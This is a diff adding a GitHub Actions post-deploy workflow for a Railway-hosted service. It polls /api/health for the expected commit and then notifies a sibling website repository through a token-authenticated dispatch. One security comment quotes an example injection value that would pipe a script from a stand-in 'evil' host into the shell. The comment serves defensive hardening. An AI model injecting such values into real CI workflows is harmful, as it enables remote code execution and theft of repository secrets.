@@ -1,0 +1,212 @@
+name: Post-deploy verification
+
+# Railway's GitHub integration already publishes Deployments and
+# deployment_status events into this repo (creator: railway-app[bot]), so
+# "Railway finished" is a first-class signal — no polling guess, no Railway
+# API token. Because railway.toml sets healthcheckPath = "/api/health",
+# state == 'success' already implies the new container served a request.
+#
+# There is no deploy step here by design: Railway auto-deploys from GitHub.
+on:
+  deployment_status:
+  workflow_dispatch:
+    inputs:
+      sha:
+        description: 'Commit sha expected to be live (blank = skip the commit assertion)'
+        required: false
+        default: ''
+
+permissions:
+  contents: read
+
+concurrency:
+  # One at a time, never cancelled: a cancelled run leaves the sibling repo
+  # un-notified with no signal that it was skipped.
+  group: post-deploy
+  cancel-in-progress: false
+
+jobs:
+  smoke:
+    name: Smoke-test live deployment and notify website
+    runs-on: ubuntu-latest
+    # Must exceed the health loop's own worst case (20 attempts x (10s curl
+    # timeout + 10s sleep) = ~400s) so the loop always loses the race and the
+    # operator gets its ::error:: diagnostic instead of an opaque
+    # "exceeded the maximum execution time" cancellation.
+    timeout-minutes: 15
+    # Railway's environment strings are inconsistent across deployments
+    # ("Production", "production", "PISCOC1 (PinkyToe Ground Zero / production)").
+    # All production variants contain "production"; "Preview" does not.
+    if: >-
+      github.event_name == 'workflow_dispatch' ||
+      (github.event.deployment_status.state == 'success' &&
+       contains(github.event.deployment.environment, 'production'))
+    env:
+      BASE_URL: ${{ vars.PISCOC1_PUBLIC_URL || 'https://www.piscoc.pinkytoepaper.com' }}
+      # Never interpolate these into a `run:` body with ${{ }}. Both are
+      # attacker-influenced: `deployment.environment` is free text chosen by
+      # whoever created the Deployment, and `inputs.sha` is typed by the person
+      # dispatching. GitHub substitutes ${{ }} into the script *before* bash
+      # parses it, so a value like `x"; curl evil|sh; echo "` would execute — in
+      # the one job that holds WEBSITE_DISPATCH_TOKEN. Passed through the
+      # environment instead, they are ordinary strings bash never re-parses.
+      EXPECT_SHA: ${{ github.event.deployment.sha || inputs.sha }}
+      DEPLOY_ENV: ${{ github.event.deployment.environment }}
+    steps:
+      - name: Context
+        run: |
+          # A Railway sha is a normal git object id; anything else is not ours
+          # and must not be presented as the verified commit.
+          if [ -n "$EXPECT_SHA" ] && ! printf '%s' "$EXPECT_SHA" | grep -Eq '^[0-9a-fA-F]{7,40}$'; then
+            echo "::error::EXPECT_SHA is not a git sha: refusing to continue"
+            exit 1
+          fi
+          {
+            echo "### Post-deploy"
+            echo "- trigger: \`${{ github.event_name }}\`"
+            echo "- environment: \`${DEPLOY_ENV:-<none>}\`"
+            echo "- expected sha: \`${EXPECT_SHA:-<none>}\`"
+            echo "- target: ${BASE_URL}"
+          } >> "$GITHUB_STEP_SUMMARY"
+
+      # Railway's own healthcheck hits the container's internal address, so this
+      # additionally proves the public edge route works. The `commit` field is
+      # the only thing that distinguishes the new build from the previous one;
+      # `database` and `sessionSecret` are Boolean(env-var-present) tautologies
+      # and are deliberately not asserted on.
+      - name: Smoke-test /api/health
+        id: health
+        env:
+          # Escape hatch. `commit` is populated from RAILWAY_GIT_COMMIT_SHA,
+          # which Railway injects for GitHub-connected services. If that turns
+          # out not to be set for this service, set the repo variable
+          # POST_DEPLOY_REQUIRE_COMMIT to "false" to fall back to an
+          # availability-only check instead of editing this file. Doing so
+          # downgrades the run to "something answered" — it can then pass
+          # against the PREVIOUS build — so it is a temporary measure.
+          REQUIRE_COMMIT: ${{ vars.POST_DEPLOY_REQUIRE_COMMIT || 'true' }}
+        run: |
+          set -u
+          matched=""
+          saw_response=""
+          saw_commit_field=""
+
+          # 20 x (<=10s curl + 10s sleep) = ~400s worst case, comfortably inside
+          # timeout-minutes: 15, so this loop always reaches its own error path.
+          for i in $(seq 1 20); do
+            body="$(curl -fsS --max-time 10 "$BASE_URL/api/health" || true)"
+            if [ -z "$body" ]; then sleep 10; continue; fi
+
+            # `|| true` on every parse: a non-JSON 2xx body (edge maintenance
+            # page, proxy interstitial) makes jq exit non-zero, and under the
+            # default `bash -e` shell a failing command substitution in an
+            # assignment would abort the whole step instead of retrying.
+            status="$(printf '%s' "$body" | jq -r '.status // empty'      2>/dev/null || true)"
+            envn="$(printf '%s' "$body"   | jq -r '.environment // empty' 2>/dev/null || true)"
+            live="$(printf '%s' "$body"   | jq -r '.commit // empty'      2>/dev/null || true)"
+
+            if [ "$status" != "ok" ] || [ "$envn" != "production" ]; then
+              echo "attempt $i: status=$status environment=$envn"; sleep 10; continue
+            fi
+            saw_response="yes"
+            [ -n "$live" ] && saw_commit_field="yes"
+
+            if [ -z "$EXPECT_SHA" ]; then matched="unverified-no-expected-sha"; break; fi
+            if [ "$live" = "$EXPECT_SHA" ]; then matched="verified"; break; fi
+
+            # A missing or mismatched commit means the edge is still routing to
+            # the OLD container. Keep polling rather than breaking: breaking here
+            # is what let this step go green against the previous deployment.
+            echo "attempt $i: live=${live:-<absent>} expected=$EXPECT_SHA"
+            sleep 10
+          done
+
+          if [ -z "$matched" ] && [ -z "$saw_response" ]; then
+            echo "::error::$BASE_URL/api/health never reported status=ok and environment=production within ~7 minutes"
+            exit 1
+          fi
+
+          if [ -z "$matched" ] && [ -z "$saw_commit_field" ]; then
+            if [ "$REQUIRE_COMMIT" != "true" ]; then
+              matched="unverified-no-commit-field"
+            else
+              echo "::error::/api/health answered but exposes no 'commit' field, so the deploy could not be proven to be the new build. Confirm RAILWAY_GIT_COMMIT_SHA is injected into the PISCOC1 service, or set the repo variable POST_DEPLOY_REQUIRE_COMMIT=false to downgrade this to an availability check."
+              exit 1
+            fi
+          fi
+
+          if [ -z "$matched" ]; then
+            echo "::error::/api/health kept reporting a different commit than $EXPECT_SHA; the rollout did not land within ~7 minutes"
+            exit 1
+          fi
+
+          # Never claim verification that was not performed.
+          case "$matched" in
+            unverified-no-commit-field)
+              echo "::warning::POST_DEPLOY_REQUIRE_COMMIT is disabled and /api/health exposes no 'commit' field. The deploy was NOT proven to be the new build." ;;
+            unverified-no-expected-sha)
+              echo "::warning::No expected sha available; only asserted the service is up." ;;
+          esac
+          echo "confidence=$matched" >> "$GITHUB_OUTPUT"
+          echo "- health: \`$matched\`" >> "$GITHUB_STEP_SUMMARY"
+
+      # Converts the secret's presence into a non-secret boolean output so the
+      # next step's `if:` can read it. `if:` cannot test a secret directly.
+      - name: Check dispatch token
+        id: token
+        env:
+          TOKEN: ${{ secrets.WEBSITE_DISPATCH_TOKEN }}
+        run: |
+          if [ -n "$TOKEN" ]; then echo "present=true" >> "$GITHUB_OUTPUT"
+          else echo "present=false" >> "$GITHUB_OUTPUT"; fi
+
+      # No secret goes in client_payload: it is readable by every workflow run
+      # in the target repo. WEBHOOK_SECRET in particular is an inbound bearer
+      # credential for this service, and siteRefresh.ts already refuses to send
+      # it to any external target for the same reason.
+      - name: Notify PinkyToeWebsite
+        if: success() && steps.token.outputs.present == 'true'
+        env:
+          # GITHUB_TOKEN is scoped to this repo and cannot dispatch cross-repo.
+          GH_TOKEN: ${{ secrets.WEBSITE_DISPATCH_TOKEN }}
+          RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
+          CONFIDENCE: ${{ steps.health.outputs.confidence }}
+        run: |
+          jq -n \
+            --arg sha       "${EXPECT_SHA:-unknown}" \
+            --arg run_url   "$RUN_URL" \
+            --arg at        "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
+            --arg conf      "$CONFIDENCE" \
+            '{event_type: "piscoc1-deployed",
+              client_payload: {
+                source: "PISCOC1",
+                environment: "production",
+                reason: "post-deploy",
+                sha: $sha,
+                ref: "main",
+                run_url: $run_url,
+                health: $conf,
+                dispatched_at: $at
+              }}' > /tmp/dispatch.json
+
+          # A delivery failure must warn, not fail. The deploy and the smoke
+          # test have both already succeeded, and the commonest cause here is a
+          # routinely-expired PAT (404/403 from the dispatch endpoint) — that is
+          # a credential-rotation chore, not a broken main. Same policy as the
+          # "Dispatch skipped" step below.
+          if gh api --method POST \
+               -H "Accept: application/vnd.github+json" \
+               /repos/pinkytoedev/PinkyToeWebsite/dispatches --input /tmp/dispatch.json; then
+            echo "- dispatched \`piscoc1-deployed\` to pinkytoedev/PinkyToeWebsite" >> "$GITHUB_STEP_SUMMARY"
+          else
+            echo "::warning::Cross-repo dispatch to pinkytoedev/PinkyToeWebsite failed. Most likely WEBSITE_DISPATCH_TOKEN expired or lost 'Contents: write'. The site falls back to its own timed cache refresh (30-60 min)."
+            echo "- dispatch: **failed** (see the warning; token likely expired)" >> "$GITHUB_STEP_SUMMARY"
+          fi
+
+      # A missing optional integration secret must not make main look broken;
+      # the smoke test is the meaningful signal and it already passed.
+      - name: Dispatch skipped
+        if: success() && steps.token.outputs.present != 'true'
+        run: |
+          echo "::warning::WEBSITE_DISPATCH_TOKEN is not set - skipping the cross-repo notification. The site will fall back to its own timed cache refresh (30-60 min)."
+          echo "- dispatch: **skipped** (no \`WEBSITE_DISPATCH_TOKEN\`)" >> "$GITHUB_STEP_SUMMARY"
